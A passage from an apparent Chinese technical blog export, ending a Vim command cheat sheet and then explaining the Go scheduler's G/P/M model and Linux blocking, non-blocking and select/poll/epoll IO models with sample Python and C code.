<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">对文本中符合模式的字符串进行替换：</span><br></pre></td></tr></table></figure>
<p>:s/old/new&lt;回车&gt; 替换当前行第一个匹配项<br>:s/old/new/g 替换当前行所有匹配项<br>:#,#s/old/new/g 替换 # 到 # 行所有的匹配项<br>:%s/old/new/g 替换文本中每个匹配项<br>:%s/old/new/gc 文本中每个匹配项都提示是否进行替换<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">插入空行并进入 insert 模式：</span><br></pre></td></tr></table></figure></p>
<p>o：在下一行插入空行<br>O：在上一行插入空行<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 保存操作</span><br></pre></td></tr></table></figure></p>
<p>:!command：执行 command，即使有命令行参数也可以这么操作<br>:w FILENAME 把文件另存为 FILEMNAME<br>v 进入 visual 模式，选择相应文本后用 :w FILENAME 把选择的文本另存为 FILENAME<br>:r FILENAME 把文件 FILENAME 内容插入到光标之后<br>:r !command 把 command 的输出插入到光标之后<br><code>`</code></p>
]]></content>
      <categories>
        <category>开发工具</category>
      </categories>
      <tags>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>调度器—Go语言的大管家</title>
    <url>/2020/04/27/%E8%B0%83%E5%BA%A6%E5%99%A8%E2%80%94Go%E8%AF%AD%E8%A8%80%E7%9A%84%E5%A4%A7%E7%AE%A1%E5%AE%B6/</url>
    <content><![CDATA[<p>虽然线程比较轻量，但是在调度时也有比较大的额外开销。每个线程会都占用 1M 以上的内存空间，在对线程进行切换时不止会消耗较多的内存，恢复寄存器中的内容还需要向操作系统申请或者销毁对应的资源，每一次线程上下文的切换都需要消耗 1us 左右的时间。而 Go 调度器对 Goroutine 的上下文切换约为 0.2us，减少了 80% 的额外开销</p>
<p>Go 语言的调度器通过使用与 CPU 数量相等的线程减少线程频繁切换的内存开销，同时在每一个线程上执行额外开销更低的 Goroutine 来降低操作系统和硬件的负载。</p>
<h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><p>调度器的三个组成部分：G(Goroutine)，P(处理器)，M(线程)</p>
<ul>
<li>G：代表 Goroutine，是一个待执行的任务</li>
<li>P：代表处理器，相当于一个与线程绑定的小型调度器</li>
<li>M：代表操作系统线程</li>
</ul>
<p><img src="https://i.loli.net/2020/04/26/F617HYhRtfTrJlM.png" alt="GMP模型"></p>
<h3 id="G"><a href="#G" class="headerlink" title="G"></a>G</h3><p>Gorotuine 就是 Go 语言调度器中待执行的任务，它在运行时调度器中的地位与线程在操作系统中差不多，但是它占用了更小的内存空间，也降低了上下文切换的开销。</p>
<p>Goroutine 只存在于 Go 语言的运行时，它是 Go 语言在用户态提供的线程，作为一种粒度更细的资源调度单元，如果使用得当能够在高并发的场景下更高效地利用机器的 CPU。</p>
<p>Goroutine 表现为私有结构体 g，下面是一些比较重要的字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> g <span class="keyword">struct</span> &#123;</span><br><span class="line">    stack stack <span class="comment">// 栈内存范围</span></span><br><span class="line">    preempt <span class="keyword">bool</span> <span class="comment">// 抢占信号</span></span><br><span class="line">    _panic *_panic <span class="comment">// 存储 panic 结构体的链表</span></span><br><span class="line">    _defer *_defer <span class="comment">// 存储 defer 结构体的链表</span></span><br><span class="line">    m *m <span class="comment">// 当前占用线程</span></span><br><span class="line">    sched gobuf <span class="comment">// 与 Goroutine 调度相关的数据</span></span><br><span class="line">    atomicstatus <span class="keyword">uint32</span> <span class="comment">// Goroutine 的状态</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sched</code> 字段对 Goroutine 的调度至关重要：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> gobuf <span class="keyword">struct</span> &#123;</span><br><span class="line">    sp <span class="keyword">uintptr</span> <span class="comment">// 栈指针</span></span><br><span class="line">    pc <span class="keyword">uintptr</span> <span class="comment">// 程序计数器</span></span><br><span class="line">    g guintptr <span class="comment">// 持有这个 gobuf 的 Goroutine</span></span><br><span class="line">    ret sys.Uintreg <span class="comment">// 系统调用的返回值</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Goroutine 的状态可分为三类：等待中、可运行、运行中</p>
<ul>
<li>等待中：Goroutine 正在等待某些条件满足，例如：系统调用结束等，包括 <code>_Gwaiting</code>、<code>_Gsyscall</code> 和 <code>_Gpreempted</code> 几个状态</li>
<li>运行时：Goroutine 已经准备就绪，可以在线程运行，如果当前程序中有非常多的 Goroutine，每个 Goroutine 就可能会等待更多的时间，即 <code>_Grunnable</code></li>
<li>运行中：Goroutine 正在某个线程上运行，即 <code>_Grunning</code></li>
</ul>
<p><img src="https://i.loli.net/2020/04/26/HYZyCRmugW4XA8K.png" alt="Goroutine状态"></p>
<h3 id="M"><a href="#M" class="headerlink" title="M"></a>M</h3><p>M 是操作系统线程。调度器最多可以创建 10000 个线程，但是其中大多数的线程都不会执行用户代码（可能陷入系统调用），最多只会有 GOMAXPROCS 个活跃线程能够正常运行。在默认情况下，运行时会将 GOMAXPROCS 设置成当前机器的核数，这样不会触发操作系统的线程调度和上下文切换，所有的调度都会发生在用户态，由 Go 语言调度器触发，能够减少非常多的额外开销。我们也可以使用 runtime.GOMAXPROCS 来改变程序中最大的线程数。</p>
<p><img src="https://i.loli.net/2020/04/26/ihSrwOGqjRa3mCo.png" alt="M与CPU"></p>
<p>线程表现为私有结构体 m，下面是一些比较重要的字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> m <span class="keyword">struct</span> &#123;</span><br><span class="line">    g0 *g <span class="comment">// 持有调度栈的 goroutine，深度参与 goroutine 的创建过程</span></span><br><span class="line">    curg *g <span class="comment">// 当前线程持有的 goroutine</span></span><br><span class="line">    p puintptr <span class="comment">// 正在运行的调度器</span></span><br><span class="line">    nextp puintptr <span class="comment">// 备用调度器</span></span><br><span class="line">    oldp puintptr <span class="comment">// 之前使用的调度器</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>通过处理器 P 的调度，每一个内核线程都能够执行多个 Goroutine，它能在 Goroutine 进行一些 I/O 操作时及时切换，提高线程的利用率。</p>
<p>调度器在启动时就会创建 GOMAXPROCS 个处理器，即处理器数量一定会等于 GOMAXPROCS，这些处理器会绑定到不同的内核线程上并利用线程的计算资源运行 Goroutine。</p>
<p>处理器表现为私有结构体 p，下面是一些比较重要的字段：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> p <span class="keyword">struct</span> &#123;</span><br><span class="line">    status <span class="keyword">uint32</span> <span class="comment">// 处理器状态</span></span><br><span class="line">    m muintptr <span class="comment">// 当前绑定的线程</span></span><br><span class="line">    runqhead <span class="keyword">uint32</span> <span class="comment">// 等待队列队头</span></span><br><span class="line">    runqtail <span class="keyword">uint32</span> <span class="comment">// 等待队列队尾</span></span><br><span class="line">    runq [<span class="number">256</span>]guintptr <span class="comment">// 等待队列</span></span><br><span class="line">    runnext guintptr <span class="comment">// 下一个需要执行的 goroutine</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/04/26/TaxLscAnwlDZq7m.png" alt="GMP三者关系"></p>
<h2 id="创建-Goroutine"><a href="#创建-Goroutine" class="headerlink" title="创建 Goroutine"></a>创建 Goroutine</h2><p><code>go</code> 关键字会被转换为 <code>runtime.newproc</code>，该函数会接收大小和表示函数的指针:</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newproc</span><span class="params">(siz <span class="keyword">int32</span>, fn *funcval)</span></span> &#123;</span><br><span class="line">    argp := add(unsafe.Pointer(&amp;fn), sys.PtrSize)</span><br><span class="line">    gp := getg()</span><br><span class="line">    pc := getcallerpc()</span><br><span class="line">    newproc1(fn, (*<span class="keyword">uint8</span>)(argp), siz, gp, pc)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>runtime.newproc1</code> 根据入参初始化一个 <code>g</code>，该函数的行为可分为：</p>
<ol>
<li>获取或者创建新的 Goroutine 结构体：从处理器的 <code>gFree</code> 列表得到一个空闲的 g。如果获取失败则创建一个新的 g</li>
<li>将传入的参数移到 Goroutine 的栈上：将 fn 的参数全部压栈</li>
<li>更新 Goroutine 调度相关的属性：设置新 g 的 sp、pc并更新其状态到 <code>_Grunnable</code></li>
<li>将 Goroutine 加入运行队列 runq：Go 语言中有两个运行队列，一个是处理器本地的运行队列，另一个是调度器持有的全局运行队列，只有在本地运行队列没有剩余空间时才会使用全局队列<br><img src="https://i.loli.net/2020/04/27/1bVMsIOvXk3Dlx7.png" alt="运行队列"></li>
</ol>
<h2 id="触发调度"><a href="#触发调度" class="headerlink" title="触发调度"></a>触发调度</h2><h3 id="主动挂起"><a href="#主动挂起" class="headerlink" title="主动挂起"></a>主动挂起</h3><p>当 goroutine 陷入休眠（如 <code>time.sleep</code>）或阻塞在一次 chan 操作时，goroutine 触发主动挂起。主动挂起会将当前 goroutine 暂停。调度器把 goroutine 状态设为 <code>_Gwaiting</code> 并<strong>解除 goroutine 与线程的绑定</strong>（相当于让出线程，随后就可以执行一次 goroutine 调度），等待状态的 goroutine 不占用线程。</p>
<p>当 goroutine 满足特定条件后，运行时将因主动挂起而休眠的 goroutine 唤醒并将其状态设为 <code>_Grunnable</code>，随后这个 goroutine 被放到运行队列等待调度。</p>
<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>当 goroutine 阻塞在一次 IO 或其它系统调用上调度器会更新 goroutine 状态为 <code>_Gsyscall</code> 并<strong>解除线程和处理器的绑定</strong>（相当于让出处理器，这样处理器就可以绑定到其它线程上。原线程陷入系统调用等待返回。这个过程触发一次线程切换的系统调用）。</p>
<p>系统调用结束后，为这个 goroutine 重新分配资源并更新其状态为 <code>_Grunnable</code>，找到一个可用的处理器与这个 goroutine 绑定。</p>
<h3 id="抢占"><a href="#抢占" class="headerlink" title="抢占"></a>抢占</h3><p>运行时会更新 Goroutine 的状态到 <code>_Grunnable</code>，让出当前的处理器并将这个 Goroutine 放回全局队列。最后，调用 runtime.schedule 触发调度。</p>
<h2 id="设计原理"><a href="#设计原理" class="headerlink" title="设计原理"></a>设计原理</h2><p>总结起来三个特点：多线程、任务窃取、抢占式：</p>
<ol>
<li>多线程：进程中可以同时存在多个活跃线程。多线程调度器引入了 GOMAXPROCS 变量帮助我们灵活控制程序中的最大处理器数，即活跃线程数</li>
<li>任务窃取：进行 goroutine 调度时，调度器会先从当前处理器或全局待运行队列中获得一个 goroutine；如果获取失败，则从其它处理器的待运行队列中随机获取 goroutine</li>
<li>抢占式：STW 和栈扫描时会触发抢占。当前 goroutine 被设为 _Gpreempted，调度器进行一次 goroutine 调度</li>
</ol>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>网络IO</title>
    <url>/2020/04/17/%E7%BD%91%E7%BB%9CIO/</url>
    <content><![CDATA[<h1 id="Linux-IO模型"><a href="#Linux-IO模型" class="headerlink" title="Linux IO模型"></a>Linux IO模型</h1><p>计算机之间可以通信，本质上也是计算机进程相互通信。为了方便不同终端进行通信，网络协议栈抽象出socket层，通过对socket文件描述符的操作来进行网络IO。当然，不同的应用场景，衍生出了不同的网络模型</p>
<h2 id="一次网络响应"><a href="#一次网络响应" class="headerlink" title="一次网络响应"></a>一次网络响应</h2><p>互联网应用中，多数架构是 CS 模式，即 client 发出请求，server 接受请求，处理之后返回响应。这样的一次交互，伴随着 client 和 server 的 IO 操作。</p>
<p>一次简单的交互，往往涉及网络 IO 和磁盘文件 IO。大致流程如图：</p>
<p><img src="https://i.loli.net/2020/04/17/jMxUNO7ltuwgRTX.png" alt="一次IO"></p>
<p>对 Server 而言，处理响应的过程如下：</p>
<ol>
<li>Server 的进程发起 Read 系统调用，内核随即从硬件 Disk 读取数据到内核缓冲区（kernel buf）</li>
<li>内核把 kernel buf 的数据 copy 到应用程序进程的缓冲区，应用程序就可以对数据进行修改。</li>
<li>应用进程将数据通过系统调用 Send 发送到 socket 缓冲区，每个 socket 文件都在内核维护了一个发送/接受缓冲区。</li>
<li>最后再把 socket 发送缓冲区的数据 copy 到 NIC 网卡中，通过协议栈发送到Client 的网卡。</li>
</ol>
<p>所谓的IO，就是将硬件（磁盘、网卡）的数据读取到程序的内存中。</p>
<p>因为应用程序很少可以直接和硬件交互，因此操作系统作为两者的桥梁。通常操作系统在对接两端（应用程序与硬件）时，自身有一个内核 buf，用于数据的 copy 中转。</p>
<p><img src="https://i.loli.net/2020/04/17/lJoTNEzbcdejuFt.png" alt="硬件、内核、应用"></p>
<p>一般网络 IO 分为两个阶段：</p>
<ol>
<li>等待数据阶段。数据通过协议栈发送到网卡，网卡再通过 DMA copy 到 kernel buf</li>
<li>拷贝数据阶段。将 kernel buf 的数据 copy 到 app buf 中。</li>
</ol>
<h2 id="Linux-5-种-IO-模型"><a href="#Linux-5-种-IO-模型" class="headerlink" title="Linux 5 种 IO 模型"></a>Linux 5 种 IO 模型</h2><h3 id="阻塞-IO"><a href="#阻塞-IO" class="headerlink" title="阻塞 IO"></a>阻塞 IO</h3><p>所谓阻塞 IO 指在网络 IO 的两个阶段进程都会阻塞。</p>
<p><img src="https://i.loli.net/2020/04/17/WoMVpI9X72KzcGN.png" alt="阻塞IO"></p>
<p>进程对象发起 Recv 操作，这是一个系统调用，然后内核会看 kernel buf 是否有数据，如果没有数据，那么进程将会被挂起，直到 kernek buf 从硬件或者网络读取到数据之后，内核再把数据从 kernel buf copy 到 app buf中，然后唤醒发起调用的进程，并且 Recv 操作将会返回数据。接下来进行可以对进程 buf 的数据进行处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">address = (<span class="string">''</span>, <span class="number">5000</span>)</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">sock.bind(address)</span><br><span class="line">sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn, addr = sock.accept() <span class="comment"># 进程会阻塞直至有数据返回</span></span><br><span class="line">    print(<span class="string">'client &#123;&#125; connect'</span>.format(conn.fileno()))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>) <span class="comment"># 进程会阻塞直至有数据返回</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print(<span class="string">'client &#123;&#125; closed'</span>.format(conn.fileno()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'data is '</span>, data)</span><br><span class="line">            conn.sendall(data)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>
<h3 id="非阻塞-IO"><a href="#非阻塞-IO" class="headerlink" title="非阻塞 IO"></a>非阻塞 IO</h3><p>当进程把一个文件描述符设置成非阻塞时，执行 read 和 write 等 I/O 操作就会立刻返回。在 C 语言中，我们可以使用如下所示的代码片段将一个文件描述符设置成非阻塞的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> flags = fcntl(fd, F_GETFL, <span class="number">0</span>);</span><br><span class="line">fcntl(fd, F_SETFL, flags | O_NONBLOCK);</span><br></pre></td></tr></table></figure>
<p>如果没有数据，发起的 IO 系统调用会马上返回一个 <code>EWOULDBLOCK</code> 错误。函数返回之后，进程没有被挂起，可以继续做别的。</p>
<p><img src="https://i.loli.net/2020/04/17/6yAJMt5CG4dRj2Z.png" alt="非阻塞IO"></p>
<p>进程获得了 EWOULDBLOCK 之后会再次发起非阻塞 IO 请求，这个过程还是会使用 CPU，因此也称之为轮询（polling）。然而此时应用程序可以对读取操作系统缓冲区中的数据并进行操作。换言之进程使用非阻塞 I/O 时可以在等待过程中执行其他的任务。</p>
<p>内核有数据的时候，内核将 kernel buf 的数据 copy 到 app buf 的过程还是需要 cpu 参与，对于非阻塞 IO 来说，这个过程仍然是阻塞的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"></span><br><span class="line">address = (<span class="string">''</span>, <span class="number">5000</span>)</span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">sock.setblocking(<span class="literal">False</span>) <span class="comment"># 将 socket 设置为非阻塞的</span></span><br><span class="line">sock.bind(address)</span><br><span class="line">sock.listen(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 获得 EWOULDBLOCK 错误，轮询</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn, addr = sock.accept()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> e.args[<span class="number">0</span>] <span class="keyword">in</span> (errno.EWOULDBLOCK, errno.EAGAIN):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'client &#123;&#125; connect'</span>.format(conn.fileno()))</span><br><span class="line">    conn.setblocking(<span class="literal">False</span>) <span class="comment"># 将 socket 设置为非阻塞的</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 轮询</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">if</span> e.args[<span class="number">0</span>] <span class="keyword">in</span> (errno.EWOULDBLOCK, errno.EAGAIN):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            print(<span class="string">'client &#123;&#125; closed'</span>.format(conn.fileno()))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'data is '</span>, data)</span><br><span class="line">            conn.sendall(data)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>
<h3 id="多路复用-IO"><a href="#多路复用-IO" class="headerlink" title="多路复用 IO"></a>多路复用 IO</h3><p>阻塞 IO 会让线程挂起。非阻塞 IO 需要一直做 polling，每一次 polling 都会做系统调用，某种程度下，非阻塞 IO 的性能将还不如阻塞 IO。既然需要内核频繁操作，那么就有人想出了新的模型：让内核代理去做轮询，然后应用进程只有数据准备了再发起 IO 操作不就好了吗？</p>
<p>多路复用 IO 就是这样的原理，所谓“多路复用”是指一个线程复用多个 socket。由内核负责监控应用指定的 socket 文件描述符，socket 准备好（可读，可写，异常等）时，通知应用进程。“准备好”是一个事件，当事件发生，通知应用进程，而应用进程可以执行事先注册的对应该事件的回调函数。有大量事件发生的前提下，多用复用 IO 可以极大提高服务器并发性能。</p>
<blockquote>
<p>多路复用 IO = 多路监听 + 阻塞/非阻塞 IO。多路监听指的是下文的 select/poll/epoll 等监听系统，这些系统监听的 socket 则负责 IO。</p>
</blockquote>
<h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><p>select 系统调用提供一个机制来实现同步 IO：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select</span><span class="params">(<span class="keyword">int</span> n, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, struct timeval* timeout)</span></span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/05/30/fMzL5wP7vETWpC6.png" alt="select模型g"></p>
<p>调用 select 将导致阻塞直到指定的文件描述符准备好执行 IO，或者可选参数 timeout 指定的时间已经过去。</p>
<p>select 成功返回时，返回值是 ready 状态的 fd 数目。每组 set 都被修改以使它只包含准备好 IO 的文件描述符。</p>
<p>例如，假设有两个 fd 分别是 7 和 9 被放在 readfds。select 返回后，应用进程需要遍历 readfds，判断其中每一个 fd 的状态，如果 7 发生读事件而 9 没有，那么对 7 读不会阻塞，对 9 读可能阻塞（”可能”是因为数据或许正好在 select 返回后就可用，这种情况下，下一次调用 select 将返回 9）。</p>
<p><strong>因为 fd_set 是静态创建的，它们对 fd 的最大数目强加了一个限制，能够放进 set 中的 fd 的数量由在 32 位机默认是 1024，64位机默认是2048。</strong></p>
<p>缺点：</p>
<ol>
<li>单进程可以打开 fd 有限制；</li>
<li>对得到的 fd_set 进行线性扫描，即采用轮询的方法，效率较低；</li>
<li>包含大量 fd 的数组在用户态和内核态的地址空间反复复制，而不论这些文件描述符是否就绪，它的开销随着文件描述符数量的增加而线性增大。</li>
</ol>
<h4 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h4><p>poll 的机制与 select 类似，与 select 在本质上没有多大差别，管理多个描述符也是进行轮询，也需要反复在用户态和内核态之间复制结构体，但是 poll 采用链表的方式替换原有 fd_set，使其<strong>没有连接数的限制</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd* fds, <span class="keyword">unsigned</span> <span class="keyword">int</span> nfds, <span class="keyword">int</span> timeout)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> fd;             <span class="comment">/* 文件描述符 */</span></span><br><span class="line">short events;       <span class="comment">/* 期望的事件 */</span></span><br><span class="line">short revents;      <span class="comment">/* 实际发生的事件 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每一个 pollfd 指定一个被监视的 fd。传递一个 pollfd 链表指示 poll 监视多个 fd。每个结构体的 events 域是监视该文件描述符的事件掩码，由用户来设置这个域。revents 域是文件描述符的操作结果事件掩码，内核在调用返回时设置这个域。</p>
<h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><p>设想一下如下场景：有 100 万个客户端同时与一个服务器进程保持着 TCP 连接。而每一时刻，通常只有几百上千个 TCP 连接是活跃的(事实上大部分场景都是这种情况)。如何实现这样的高并发？</p>
<p>在 select/poll 时代，服务器进程每次都把这 100 万个连接告诉操作系统(从用户态复制句柄数据结构到内核态)，让操作系统内核去查询这些套接字上是否有事件发生，轮询完后，再将句柄数据复制到用户态，让服务器应用程序轮询处理已发生的网络事件，这一过程资源消耗较大，因此，select/poll 一般只能处理几千的并发连接。</p>
<p>epoll 是是之前的 select/poll 的增强版本。相比 select/poll，epoll 更加灵活，没有描述符限制。epoll 使用一个文件描述符管理多个描述符，将用户关系的文件描述符的事件存放到内核的一个事件表中，这样在用户空间和内核空间的 copy 只需一次。</p>
<p>epoll 提供三个接口：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="comment">// 创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* epoll的事件注册函数，注册要监听的事件类型。</span></span><br><span class="line"><span class="comment">第一个参数是 epoll_create()的返回值；</span></span><br><span class="line"><span class="comment">第二个参数表示动作，用三个宏来表示：EPOLL_CTL_ADD，EPOLL_CTL_MOD，EPOLL_CTL_DEL；</span></span><br><span class="line"><span class="comment">第三个参数是需要监听的 fd；</span></span><br><span class="line"><span class="comment">第四个参数是告诉内核需要监听什么事 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd, struct epoll_event* event)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* 等待事件的产生，类似于select()调用。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd, struct epoll_event* events, <span class="keyword">int</span> maxevents, <span class="keyword">int</span> timeout)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第一步：epoll_create 系统调用。此调用返回一个句柄，之后所有的使用都依靠这个句柄来标识。</p>
<p>第二步：epoll_ctl 系统调用。通过此调用向 epoll 对象中添加、删除、修改感兴趣的事件，返回 0 表示成功，返回 -1 表示失败。</p>
<p>第三部：epoll_wait 系统调用。通过此调用收集收集在 epoll 监控中已经发生的事件。</p>
<p><strong>下面来看看 epoll 是怎么实现的：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> &#123;</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="comment">/*红黑树的根节点，这颗树中存储着所有添加到epoll中的需要监控的事件*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span>  <span class="title">rbr</span>;</span></span><br><span class="line">    <span class="comment">/*双链表中则存放着将要通过epoll_wait返回给用户的满足条件的事件*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">rdlist</span>;</span></span><br><span class="line">    ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每次调用 epoll_create 方法，内核创建一个 eventpoll 结构体，用于存放通过 epoll_ctl 方法向epoll对象中添加进来的事件。这些事件都会挂载在红黑树中，如此，重复添加的事件就可以通过红黑树而高效的识别出来。</p>
<p>所有添加到 epoll 中的事件都会与设备(网卡等)建立回调关系。也就是说，当相应的事件发生时会调用这个回调方法。这个回调方法在内核中叫 ep_poll_callback，它会将发生的事件添加到 rdlist 双链表中。</p>
<p>每一个事件都会创建一个对应的 epitem 结构体：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epitem</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span>  <span class="title">rbn</span>;</span><span class="comment">//红黑树节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">rdllink</span>;</span><span class="comment">//双向链表节点</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_filefd</span>  <span class="title">ffd</span>;</span>  <span class="comment">//事件句柄信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eventpoll</span> *<span class="title">ep</span>;</span>    <span class="comment">//指向其所属的eventpoll对象</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span> <span class="comment">//期待发生的事件类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当调用 epoll_wait 检查是否有事件发生时，只需要检查 eventpoll 对象中的 rdlist 双链表中是否有 epitem 元素即可。如果 rdlist 不为空，则把发生的事件复制到用户态，同时将事件数量返回给用户:</p>
<p><img src="https://i.loli.net/2020/04/24/ZVMg1j5dHoRU6Bf.png" alt="Epoll实现"></p>
<p>优点：</p>
<ol>
<li>支持一个进程持有大数目的 fd。epoll 底层用红黑树管理 fd，所支持的 fd 上限是最大可以打开文件的数目。</li>
<li>IO 效率不随 fd 数目增加而线性下降。举个例子：传统的 select/poll 另一个致命弱点就是当你拥有一个很大的 socket 集合，任一时间只有部分 socket 处于 ready 状态。但是 select/poll 每次调用返回后都要线性扫描全部的 socket、检查所有 socket 的状态，导致效率呈现线性下降。epoll 不存在这个问题，它只会对 ready socket 进行操作。</li>
<li>epoll 对每个 fd 只会进行一次用户态到内核态的复制。</li>
</ol>
<h2 id="水平触发与边缘触发"><a href="#水平触发与边缘触发" class="headerlink" title="水平触发与边缘触发"></a>水平触发与边缘触发</h2><ul>
<li>水平触发（Level Triggered, LT）：只要文件描述符关联的读内核缓冲区非空，有数据可以读取，就一直发出可读信号进行通知，当文件描述符关联的内核写缓冲区不满，有空间可以写入，就一直发出可写信号进行通知。LT 同时支持阻塞 IO 与非阻塞 IO。在这种模式下，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的 fd 进行 IO 操作。如果你不作任何操作，内核还是会继续通知你的，所以，这种模式编程出错误可能性要小一点。<strong>传统的 select/poll 都是采用这种模式，epoll 默认也是这种模式</strong>。</li>
